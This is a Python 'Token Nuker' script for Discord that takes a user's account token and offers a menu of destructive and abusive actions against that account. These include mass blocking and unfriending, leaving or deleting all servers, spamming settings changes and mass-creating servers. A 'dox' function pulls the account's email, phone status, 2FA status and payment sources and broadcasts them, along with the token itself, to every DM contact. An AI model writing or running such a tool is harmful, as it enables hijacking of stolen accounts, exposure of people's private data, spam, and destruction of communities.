import requests, httpx, os
import threading, base64
from colorama import init, Fore

init(convert=True)

tokentouse = input('Token to use: ')

cookiez = httpx.get('https://discord.com/register').headers['set-cookie']
sep = cookiez.split(";")
sx = sep[0]
sx2 = sx.split("=")
dfc = sx2[1]
split = sep[6]
split2 = split.split(",")
split3 = split2[1]
split4 = split3.split("=")
sdc = split4[1]

def headers():
    header = {
        "authority": "discord.com",
        "method": "POST",
        "path": "/api/v9/users/@me",
        "scheme": "https",
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US",
        "Authorization": f"{tokentouse}",
        "content-length": "0",
        "cookie": f"__dcfduid={dfc}; __sdcfduid={sdc}",
        "origin": "https://discord.com",
        'referer': 'https://discord.com/channels/@me',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": 'Mozilla/5.0 (Windows NT 6.1; rv:40.0) Gecko/20100101 Firefox/40.0',
        "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
        "x-debug-options": "bugReporterEnabled",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
    }

    return header

def clearmenu():
    os.system('cls' if os.name=='nt' else 'clear')

def maintool():
    clearmenu()

    options1 = input(f'''       
{Fore.RED}/$$$$$$$$        /$$                                 /$$   /$$           /$$                          
|__  $$__/       | $$                                | $$$ | $$          | $$                          
   | $$  /$$$$$$ | $$   /$$  /$$$$$$  /$$$$$$$       | $$$$| $$ /$$   /$$| $$   /$$  /$$$$$$   /$$$$$$ 
   | $$ /$$__  $$| $$  /$$/ /$$__  $$| $$__  $$      | $$ $$ $$| $$  | $$| $$  /$$/ /$$__  $$ /$$__  $$
   | $$| $$  \ $$| $$$$$$/ | $$$$$$$$| $$  \ $$      | $$  $$$$| $$  | $$| $$$$$$/ | $$$$$$$$| $$  \__/
   | $$| $$  | $$| $$_  $$ | $$_____/| $$  | $$      | $$\  $$$| $$  | $$| $$_  $$ | $$_____/| $$      
   | $$|  $$$$$$/| $$ \  $$|  $$$$$$$| $$  | $$      | $$ \  $$|  $$$$$$/| $$ \  $$|  $$$$$$$| $$      
   |__/ \______/ |__/  \__/ \_______/|__/  |__/      |__/  \__/ \______/ |__/  \__/ \_______/|__/      
                                                                                                       
    {Fore.LIGHTMAGENTA_EX}                                                                                                   
[A] Mass Block          [E] Delete All Servers       [I] Change Pfp, Bio, Status
[B] Mass Unfriend       [F] Blind User               [J] Change Nicknames
[C] Mass DM             [G] Dox Token                       
[D] Leave All Servers   [H] Mass Create Servers                                                                                               
    
[?>]''').lower()

    def massblock():
        url = 'https://discord.com/api/v9/users/@me/relationships'

        payload = {"type": 2}
        r = requests.get(url, headers=headers()).json()
        for x in r:
            e = requests.put(f'{url}/{x["id"]}', headers=headers(), json=payload)
            if e.status_code == 200 or 204:
                print(f"{Fore.GREEN}Successfully blocked {x['id']}")
            else:
                print(Fore.RED + e.text)

    def massunfriend():
        url1 = 'https://discord.com/api/v9/users/@me/relationships'
        r = requests.get(url1, headers=headers()).json()
        for x in r:
            e = requests.delete(f'{url1}/{x["id"]}', headers=headers())
            if e.status_code == 204:
                print(f'{Fore.GREEN}Successfully unfriended {x["id"]}')
            else:
                print(Fore.RED + e.text)

    def massdm():
        message = input('What message do you want to mass dm?: ')
        massdms = requests.get("https://discord.com/api/v9/users/@me/channels", headers=headers()).json()
        for user in massdms:
          payload = {
            'content':message
          }
          l = requests.post(f"https://discord.com/api/v9/channels/{user['id']}/messages",headers=headers(), json=payload)
          if l.status_code == 200 or 204:
            print(f'{Fore.GREEN}Sent Dm to {user["id"]}')
          else:
            print(f'{Fore.RED}Could not send a Dm to {user["id"]}')

    def leaveallservers():
        url = 'https://discord.com/api/v9/users/@me/guilds'
        
        r = requests.get(url,headers=headers()).json()
        for i in r:
            t = requests.delete(f'https://discord.com/api/v9/users/@me/guilds/{i["id"]}',headers=headers())
            if t.status_code == 204 or 200:
                print(f"{Fore.GREEN}Succefully left {i['id']}")
            else:
                print(Fore.RED + t.text)

    def deleteallservers():
        url = f'https://discord.com/api/v9/users/@me/guilds'
        r = requests.get(url, headers=headers()).json()

        for x in r:
            t = requests.post(f"https://discord.com/api/v9/guilds/{x['id']}/delete",headers=headers())
            if t.status_code == 204:
                print(f'{Fore.RED}Deleted {x["id"]}')
            else:
                print(f'{Fore.GREEN}Failed to delete {x["id"]}')

    def blinduser():
        url = 'https://discord.com/api/v9/users/@me/settings'

        changset = True
        payload = {"theme": "light", "developer_mode": changset, "afk_timeout": 60, "locale": "ko",
                    "message_display_compact": changset, "explicit_content_filter": 2,
                    "default_guilds_restricted": changset,
                    "friend_source_flags": {"all": changset, "mutual_friends": changset,"mutual_guilds": changset},
                    "inline_embed_media": changset, "inline_attachment_media": changset,
                    "gif_auto_play": changset, "render_embeds": changset,
                    "render_reactions": changset, "animate_emoji": changset,
                    "convert_emoticons": changset, "animate_stickers": 1,
                    "enable_tts_command": changset, "native_phone_integration_enabled": changset,
                    "contact_sync_enabled": changset, "allow_accessibility_detection": changset,
                    "stream_notifications_enabled": changset, "status": "idle",
                    "detect_platform_accounts": changset, "disable_games_tab": changset}

        changset = False
        payload2 = {"theme": "dark", "developer_mode": changset, "afk_timeout": 120, "locale": "bg",
                    "message_display_compact": changset, "explicit_content_filter": 0,
                    "default_guilds_restricted": changset,
                    "friend_source_flags": {"all": changset, "mutual_friends": changset, "mutual_guilds": changset},
                    "inline_embed_media": changset, "inline_attachment_media": changset,
                    "gif_auto_play": changset, "render_embeds": changset,
                    "render_reactions": changset, "animate_emoji": changset,
                    "convert_emoticons": changset, "animate_stickers": 2,
                    "enable_tts_command": changset, "native_phone_integration_enabled": changset,
                    "contact_sync_enabled": changset, "allow_accessibility_detection": changset,
                    "stream_notifications_enabled": changset, "status": "dnd",
                    "detect_platform_accounts": changset, "disable_games_tab": changset}

        print(f'{Fore.GREEN}Blinding User!')
        def threadtarget():
            for x in range(20):
                r = requests.patch(url,headers=headers(), json=payload)

                t = requests.patch(url,headers=headers(), json=payload2)

        for x in range(5):
            threading.Thread(target=threadtarget, daemon=True).start()

    def dox():
        at = requests.get('https://discord.com/api/v9/users/@me/billing/payment-sources', headers=headers())
        print(at.json())
        tokeninfourl = 'https://discord.com/api/v9/users/@me'

        r = requests.get(tokeninfourl, headers=headers())

        url2 = 'https://discord.com/api/v9/users/@me/relationships'
        numoffriend = 0

        t = requests.get(url2, headers=headers()).json()
        for id in t:
            numoffriend += 1

        numofguilds = 0
        e = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=headers()).json()
        for id in e:
            numofguilds += 1

        userid = f'User Id: {r.json()["id"]}'
        fullname = f'Full Name: {r.json()["username"]}#{r.json()["discriminator"]}'
        numberoffriends = f'Number Of Friends + Friend Requests: {numoffriend}'
        numofservers = f'Number Of Servers: {numofguilds}'

        pf = r.json()["avatar"]
        id = r.json()["id"]
        pfp = f'https://cdn.discordapp.com/avatars/{id}/{pf}'

        realpfp = f'Profile Picture: {pfp}'

        if r.json()['banner'] == 'null':
            banner = f'Banner: None'
        else:
            banner = f'Banner: https://cdn.discordapp.com/banners/{r.json()["id"]}/{r.json()["banner"]}'

        bio = f'Bio: {r.json()["bio"]}'
        lang = f'Language: {r.json()["locale"]}'
        email = f'Email: {r.json()["email"]}'
        mfa = f'2fa: {r.json()["mfa_enabled"]}'
        mailverify = f'Email Verifed: {r.json()["verified"]}'
        if r.json()['phone'] == 'null' or 'Null' or 'None' or '':
            sms = f'Phone Verification: False'
        else:
            sms = f'Phone Verification: True'

        flags = f'Public Flags: {r.json()["public_flags"]}'

        settings = 'https://discord.com/api/v9/users/@me/settings'
        t = requests.get(settings, headers=headers())
        status = f'Custom Status: {t.json()["custom_status"]}'
        satus2 = f'Status: {t.json()["status"]}'

        payload = {
            'content':
            f'```This accounts token is: {tokentouse}, have fun!\n______________________________________________________________________________________________\n\n More Information\n\n- {userid}\n- {fullname}\n- {numberoffriends}\n- {numofservers}\n- {realpfp}\n- {banner}\n- {bio}\n- {lang}\n- {email}\n- {mfa}\n- {mailverify}\n- {sms}\n- {flags}\n- {status}\n- {satus2}```'
            
        }

        massdms = requests.get("https://discord.com/api/v9/users/@me/channels", headers=headers()).json()
        for x in massdms:
            r = requests.post(f"https://discord.com/api/v9/channels/{x['id']}/messages",headers=headers(), json=payload)
            if r.status_code == 200 or 201:
                print(f'{Fore.GREEN}Doxxed the token to {x["id"]}')
            else:
                print(f'{Fore.RED}Failed to dox the token to {"id"}')

    def makeservers():
        servernames = input('What do you want the servers to be named?: ')
        profile = input('What do you want the server icon as (n for no icon): ').lower()

        if profile in ['n','no']:
            pfpicon = 'null'
        elif profile != 'n' or 'no':
            with open(profile,'rb') as image:
                e = base64.b64encode(image.read())
                part1,part2 = profile.split('.')
                pfpicon = f'data:image/{part2};base64,{e.decode("utf-8")}'
        else:
            print('Weird')

        payload2 = {
            'name': servernames,
            'icon': pfpicon
        }

        def startthread():
            for x in range(10):
                createserver = requests.post('https://discord.com/api/v9/guilds', headers=headers(), json=payload2)
                if createserver.status_code == 201:
                    print(f'{Fore.GREEN}Made A Server!')
                else:
                    print(f'{Fore.RED}Failed to make a server')

        threads = []
        for x in range(10):
            t = threading.Thread(target=startthread)
            t.start()
            threads.append(t)
        
        for thread in threads:
            t.join()

    def manage():
        pfp = input('Profile Picture (name of picture): ')
        bio = input('Bio: ')
        status = input('Status: ')
        with open(pfp,'rb') as image:
            e = base64.b64encode(image.read())
            part1,part2 = pfp.split('.')
            pfpicon = f'data:image/{part2};base64,{e.decode("utf-8")}'

        payload1 = {
            'avatar':pfpicon
        }

        pfppost = requests.patch('https://discord.com/api/v9/users/@me', headers=headers(), json=payload1)
        if pfppost.status_code == 200:
            print(f'{Fore.GREEN}Changed Pfp!')
        else:
            print(f'{Fore.RED}Failed to change pfp')

        payload2 = {
            'bio':bio
        }

        biopost = requests.patch('https://discord.com/api/v9/users/@me', headers=headers(), json=payload2)
        if pfppost.status_code == 200:
            print(f'{Fore.GREEN}Changed Bio!')
        else:
            print(f'{Fore.RED}Failed to change Bio')

        payload3 = {
            'custom_status': {'text': status}
        }

        statuspost = requests.patch('https://discord.com/api/v9/users/@me/settings', headers=headers(), json=payload3)
        if pfppost.status_code == 200:
            print(f'{Fore.GREEN}Changed Status!')
        else:
            print(f'{Fore.RED}Failed to change Status')

    def nicknames():
        nick = input('Nickname: ')   
        url = f'https://discord.com/api/v9/users/@me/guilds'
        r = requests.get(url, headers=headers()).json()
        for x in r:
            changenick = requests.patch(f'https://discord.com/api/v9/guilds/{x["id"]}/members/@me', headers=headers(), json={'nick':nick})
            if changenick.status_code == 200:
                print(f'{Fore.GREEN}Changed Nickname in {x["id"]}!')
            else:
                print(f'{Fore.RED}Failed to change Nickname in {x["id"]}')

    if options1 in ['a']:
        massblock()
    elif options1 in ['b']:
        massunfriend()
    elif options1 in ['c']:
        massdm()
    elif options1 in ['d']:
        leaveallservers()
    elif options1 in ['e']:
        deleteallservers()
    elif options1 in ['f']:
        blinduser()
    elif options1 in ['g']:
        dox()
    elif options1 in ['h']:
        makeservers()
    elif options1 in ['i']:
        manage()
    elif options1 in ['j']:
        nicknames()
    else:
        print('Not A Valid Option')

    os.system('pause')
    maintool() 

maintool()
